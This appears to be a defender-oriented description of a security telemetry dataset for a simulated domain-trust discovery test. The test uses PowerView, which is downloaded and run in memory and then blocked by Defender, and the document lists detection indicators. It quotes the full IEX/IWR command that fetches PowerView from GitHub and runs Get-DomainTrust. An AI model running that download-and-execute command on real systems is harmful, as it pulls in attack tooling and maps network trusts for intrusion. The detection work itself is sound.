# T1482-6: Domain Trust Discovery — Get-DomainTrust with PowerView

## Technique Context

T1482 (Domain Trust Discovery) via PowerView is a standard post-exploitation technique. PowerView
(part of PowerSploit) provides rich AD enumeration capabilities through PowerShell without
requiring admin rights or RSAT tools. `Get-DomainTrust` enumerates trust relationships for the
current domain. Attackers frequently download PowerView directly from GitHub using
`Invoke-Expression` + `Invoke-WebRequest` (IEX + IWR) to avoid writing it to disk. This test
exercises that exact network-delivery pattern.

## What This Dataset Contains

This dataset captures telemetry from a PowerView `Get-DomainTrust` execution attempt via
in-memory download on ACME-WS02.

**Security channel (4688/4689)** provides the decisive evidence. A 4688 event captures the full
command: `powershell.exe` executing `IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/
PowerSploit/.../PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose`. The PowerShell process
exits with `0xC0000022` (STATUS_ACCESS_DENIED) — Windows Defender detected and terminated the
process before `Get-DomainTrust` could complete. A preceding cmd.exe exits `0x1` (the test framework
wrapper failing its pre-check).

**Sysmon channel** (25 events, IDs 1, 7, 8, 10, 11, 17) contributes the broadest view of this
test. Sysmon ID 8 (CreateRemoteThread) events are notable — they may reflect PowerShell's AMSI
instrumentation or Defender's inspection hooks firing inside the PowerShell process before
termination. Sysmon ID 7 (ImageLoad) events document the .NET and PowerShell assembly stack that
loaded before Defender intervened.

**PowerShell channel** (41 events, IDs 4103/4104) contains ART test framework boilerplate. No PowerView
function calls are captured — Defender terminated the process before the script block completed
logging.

## What This Dataset Does Not Contain

- `Get-DomainTrust` output — Defender killed the process before enumeration completed
- Network connection to raw.githubusercontent.com — the IWR download was likely blocked by AMSI
  before the web request executed, or the process was killed immediately after
- Successful PowerView function invocations in the PowerShell channel

## Assessment

This dataset captures a **Defender-blocked PowerView download attempt** with clear kill evidence.
The exit code `0xC0000022` is the definitive indicator that Defender (not a script error or missing
tool) terminated the process. The full command line including the GitHub raw URL and function name
is preserved in Security 4688. The Sysmon ID 8 events (CreateRemoteThread) are an interesting
secondary artifact worth preserving — they reflect AMSI or Defender instrumentation hooking into
the PowerShell process during signature scanning.

## Detection Opportunities Present in This Data

- **Security 4688**: PowerShell command line containing `IEX` + `IWR` + `PowerSploit` GitHub URL
  is a direct IOC; any of these components individually is also a detection anchor
- **Security 4689**: Exit code `0xC0000022` on a PowerShell process that issued an outbound web
  request indicates Defender termination of a suspicious script
- **Sysmon ID 1**: powershell.exe spawned by powershell.exe with IEX/IWR invocation; the
  PowerSploit URL in the command line is directly visible
- **Sysmon ID 8**: CreateRemoteThread events in the PowerShell process during AMSI scanning can
  serve as a behavioral indicator for memory-resident tooling detection attempts
